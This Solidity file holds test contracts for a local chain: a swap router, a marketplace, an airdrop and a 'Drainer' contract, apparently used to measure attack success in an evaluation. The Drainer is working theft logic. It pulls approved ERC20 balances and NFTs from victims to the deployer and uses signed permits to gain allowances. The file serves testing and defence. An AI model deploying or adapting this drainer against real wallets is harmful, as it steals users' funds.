// SPDX-License-Identifier: MIT
// Test-only dapps (router, marketplace, airdrop) and a FAKE drainer used to measure attack success
// on a local anvil chain. Never deploy anywhere else.
pragma solidity ^0.8.24;

interface IERC20 {
    function transferFrom(address, address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function permit(address, address, uint256, uint256, uint8, bytes32, bytes32) external;
    function mint(address, uint256) external;
}

interface IERC721 {
    function transferFrom(address, address, uint256) external;
    function ownerOf(uint256) external view returns (address);
}

contract SwapRouter {
    function swap(address tokenIn, address tokenOut, uint256 amountIn) external {
        IERC20(tokenIn).transferFrom(msg.sender, address(this), amountIn);
        IERC20(tokenOut).transfer(msg.sender, amountIn); // 1:1 test pricing
    }
}

contract Marketplace {
    mapping(address => mapping(uint256 => uint256)) public price;
    function list(address nft, uint256 id, uint256 p) external {
        require(IERC721(nft).ownerOf(id) == msg.sender, "owner");
        price[nft][id] = p;
    }
}

contract Airdrop {
    address public token;
    mapping(address => bool) public claimed;
    constructor(address t) { token = t; }
    function claim() external { require(!claimed[msg.sender]); claimed[msg.sender] = true; IERC20(token).mint(msg.sender, 10 ether); }
}

contract Drainer {
    address public immutable attacker;
    constructor() { attacker = msg.sender; }

    function drain(address token, address victim) public {
        uint256 b = IERC20(token).balanceOf(victim);
        uint256 a = IERC20(token).allowance(victim, address(this));
        uint256 v = a < b ? a : b;
        if (v > 0) IERC20(token).transferFrom(victim, attacker, v);
    }

    function drainNFT(address nft, address victim, uint256[] calldata ids) external {
        for (uint256 i = 0; i < ids.length; i++) {
            try IERC721(nft).transferFrom(victim, attacker, ids[i]) {} catch {}
        }
    }

    function drainWithPermit(address token, address victim, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external {
        IERC20(token).permit(victim, address(this), value, deadline, v, r, s);
        drain(token, victim);
    }
}
